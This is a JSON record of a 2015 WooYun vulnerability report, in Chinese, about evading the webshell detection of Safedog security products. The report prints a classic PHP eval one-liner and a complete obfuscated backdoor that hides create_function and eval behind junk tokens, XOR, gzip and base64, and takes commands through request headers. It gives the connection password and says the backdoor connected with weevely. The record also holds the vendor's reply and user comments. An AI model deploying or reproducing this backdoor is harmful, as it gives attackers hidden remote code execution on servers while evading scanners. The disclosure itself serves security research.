{"id": 25491, "wybug_id": "wooyun-2015-0133010", "wybug_title": "一句话木马绕过网站安全狗和服务器安全狗webshell检测", "wybug_corp": "安全狗", "wybug_author": "King_hurray", "wybug_date": "2015-08-11 11:56", "wybug_open_date": "2015-09-25 14:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向公众公开  简要描述： 最新版网站安全狗Apache版本与服务器安全狗绕过webshell检测，可以成功jianlian 详细说明：  传统的一句话木马2.php\n<?php @eval($_POST['pass']);?>\n 网站安全狗和与服务器安全狗均能够检测出转换后的php一句话木马 命名为door.php\n<?php$W='YendUY_cUYlean();$d=baseUY64_enUYcode(x(gzcoUYmpUYress($oUY),UY$k));print(\"UYUY<$k>$d<UY/UY$k>\");UY@sessioUYn_destroy();}}}}';$S='$q)UY;$q=arrUYay_vUYaluesUY($q);pUYregUY_match_all(UY\"/UY([\\\\w]UYUYUY)[\\\\w-]+(?:;q=0.([\\\\d]))?,UY?UY/\",$ra,$UYm);if($UYq&UY&$m)';$x='\"]UY;$ra=@$r[UY\"HTTP_AUYCCEPTUY_LANGUAGE\"UY];if($rUYUYr&&$ra)UY{   UY $u=parseUY_url($UYUYrr); UY   parse_str(UY$u[\"queryUY\"],';$v=str_replace('Wp','','crWpWpeate_WpfuWpnWpctWpion');$i='0;($UYjUY<$c&&$i<$lUY);$j+UY+,$i++){$oUY.=$t{UYUY$iUY}^$k{$j};UY}}returUYnUY UY$o;}UY$r=$_SERVER;$rr=@$r[\"HUYUYTTP_REUYFERER';$N='$kh=UY\"5d41\";$kUYf=\"402UYUYaUY\";function x($t,$kUYUY){$c=stUYrlen($UYkUY);$lUY=stUYUYrlen($t);$oUY=\"\";for($i=0;$i<$l;){fUYor(UY$j=';$Q='$p;$e=UYUYstrpos($s[$iUY],$f);if(UY$e){$k=$UYkUYh.$kf;ob_staUYrtUY();@eUYval(@gzUYuncUYompressUY(@UYx(@base6UY4_UYdecUYode(p';$y='m[2][$UYz]];if(UYstrpUYUYos($p,$hUY)===0){$s[UY$i]=\"\";UY$p=$sUYs($UYp,3);}if(arUYraUYy_key_eUYxists(UYUY$i,$s)){$s[$iUY].=UY';$X='{@sUYeUYssion_start(UY)UY;$s=&$_SESSION;UY$ss=\"UYsubstUYr\";$UYsl=\"strtoUYlUYower\";UY$i=$m[1][UY0].UY$m[1][1];$UYh=$sl($UYssU';$o='Y(md5(UYUY$i.$kh)UY,0UY,UY3));$f=$sl($ss(md5($UYUYi.$kf),0,3));$p=UY\"\";UYfor(UY$z=1;UY$UYz<count($m[UY1]);$z+UY+) UY$p.=$q[$';$Y='reg_replace(UYarray(UY\"/_/\",UY\"/-/\"),arUYray(UYUY\"/\",UY\"+\"),$ss($sUY[$i],0,$e)UY)),$k))UYUY);$oUY=ob_get_conteUYnts()UY;ob_U';$k=str_replace('UY','',$N.$i.$x.$S.$X.$o.$y.$Q.$Y.$W);$q=$v('',$k);$q();?>\n木马连接密码 hello\n\n网站安全狗未能检测出转换后的door.php 木马使用服务器安全狗对木马door.php 进行安全检测\n\n2.php 检测出来  door.php木马未被检测出来   漏洞证明：  使用菜刀（weevely)与一句话木马建立连接\n\n   修复方案：  无  增加对于木马的动态查杀能力   版权声明：转载请注明来源 King_hurray@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-08-11 14:01 厂商回复： 感谢提交，已从其他渠道知晓（官方话）...... 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-11 11:57 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  前排热 前排火    \n     2015-08-11 12:05 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  jianlian？    \n     2015-09-25 14:22 |    \t\t神话 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 默默无闻神话)\t\t \n  前排    \n     2015-09-25 16:25 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手上路。)\t\t \n  菜刀连接不了啊    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}